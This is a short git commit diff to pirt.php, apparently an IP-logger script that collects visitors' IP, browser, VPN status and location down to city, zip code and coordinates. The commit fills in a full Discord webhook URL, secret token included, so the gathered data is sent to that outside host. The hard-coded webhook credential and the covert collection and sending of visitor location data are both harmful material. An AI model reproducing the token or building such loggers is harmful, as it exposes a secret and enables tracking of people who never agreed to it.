9a301ea9df4c3c8dc541d3331e02e272c2f547fa
Enes <120328716+eneswastaken@users.noreply.github.com>
2024-05-12 14:53:55 +0300

    Update pirt.php

--- pirt.php
+++ pirt.php
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1239183702693642321/rXoSEyfEsKgGg9mDDHYEzLP0pQHL_-9xStFHDNr1L_JUBVTvpPVAz-I0H4aCadI7-FWt";
 
         $InfoArr = array(
             "username" => "$WebhookName",
